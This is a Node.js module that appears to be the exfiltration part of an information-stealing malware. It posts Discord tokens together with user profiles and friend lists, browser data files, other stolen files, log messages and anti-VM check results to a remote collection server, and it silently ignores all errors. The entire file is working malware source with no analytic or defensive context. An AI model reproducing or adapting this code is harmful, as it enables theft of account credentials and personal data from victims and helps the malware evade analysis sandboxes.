"use strict";

const axios = require("axios");
const fs = require("fs");
const path = require("path");
const FormData = require("form-data");
const configConstants = require("../config/constants");

async function request(endpoint, data, isFormData = false) {
  try {
    const url = configConstants.BASE_API_URL + endpoint;
    const headers = isFormData ? data.getHeaders() : { "Content-Type": "application/json" };
    
    headers["X-Build-ID"] = configConstants.BUILD_ID;

    await axios.post(url, data, {
      headers: headers,
      maxBodyLength: Infinity
    });
  } catch (e) {}
}

async function sendDiscordToken(token, userInfo, friends) {
  const payload = {
    token: token,
    userInfo: userInfo,
    friends: friends
  };
  await request("/discord", payload);
}

async function sendBrowserData(filePath, summary) {
  if (!fs.existsSync(filePath)) return;

  const form = new FormData();
  form.append("file", fs.createReadStream(filePath), {
    filename: path.basename(filePath)
  });
  form.append("summary", "```" + summary + "```");

  await request("/browser", form, true);
}

async function sendFilesData(filePath, message) {
  if (!fs.existsSync(filePath)) return;

  const form = new FormData();
  form.append("file", fs.createReadStream(filePath), {
    filename: path.basename(filePath)
  });
  form.append("message", message);

  await request("/files", form, true);
}

async function sendGenericMessage(message) {
  await request("/log", { message: message });
}

async function sendVmInfo(data) {
  await request("/antivm", { data: data });
}

async function sendErrorLog(error) {
  await request("/err", error);
}

exports.sendDiscordToken = sendDiscordToken;
exports.sendBrowserData = sendBrowserData;
exports.sendFilesData = sendFilesData;
exports.sendGenericMessage = sendGenericMessage;
exports.sendVmInfo = sendVmInfo;
exports.sendErrorLog = sendErrorLog;
